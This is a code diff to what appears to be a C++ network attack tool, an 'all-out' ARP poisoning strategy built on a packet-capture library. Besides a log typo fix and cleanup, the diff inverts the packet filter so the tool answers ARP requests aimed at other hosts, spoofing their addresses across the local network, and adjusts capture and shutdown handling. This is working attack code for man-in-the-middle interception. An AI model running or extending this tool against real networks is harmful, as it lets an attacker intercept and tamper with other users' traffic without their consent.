@@ -20,7 +20,7 @@ void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
 
     if (requestEthLayer == nullptr || requestArpLayer == nullptr) {
         LOG_ERROR(
-            "Invalid filter configuration, foudn packet with missing layers");
+            "Invalid filter configuration, found packet with missing layers");
         throw std::runtime_error(
             "Invalid filter configuration, found packet with missing layers");
     }
@@ -28,7 +28,7 @@ void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
     // determine whether or not to handle packet
     if ((requestEthLayer->getSourceMac() == device->getMacAddress() ||
          requestEthLayer->getSourceMac() == attackerMac_) ||
-        requestArpLayer->getTargetIpAddr() != device->getIPv4Address()) {
+        requestArpLayer->getTargetIpAddr() == device->getIPv4Address()) {
         LOG_INFO("skipped packet");
         return;
     }
@@ -48,6 +48,7 @@ void ATK::ARP::AllOutArpPoisoningStrategy::onPacketArrives(
     responsePacket.computeCalculateFields();
 
     if (!device->sendPacket(&responsePacket)) {
+        device->stopCapture();
         LOG_ERROR("Failed to send packet");
         throw std::runtime_error("Failed to send packet");
     };
@@ -72,7 +73,6 @@ void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
         throw std::runtime_error(
             "Unable to set arp and ethertype filters on interface");
     };
-
     if (!device_->startCapture(
             [this](pcpp::RawPacket *packet, pcpp::PcapLiveDevice *device,
                    void *cookie) { onPacketArrives(packet, device, cookie); },
@@ -82,6 +82,8 @@ void ATK::ARP::AllOutArpPoisoningStrategy::execute() {
         LOG_ERROR("Unable to start capturing arp packets");
         throw std::runtime_error("Unable to start capturing arp packets");
     };
+
+    completionFuture.wait();
 
     device_->close();
 }
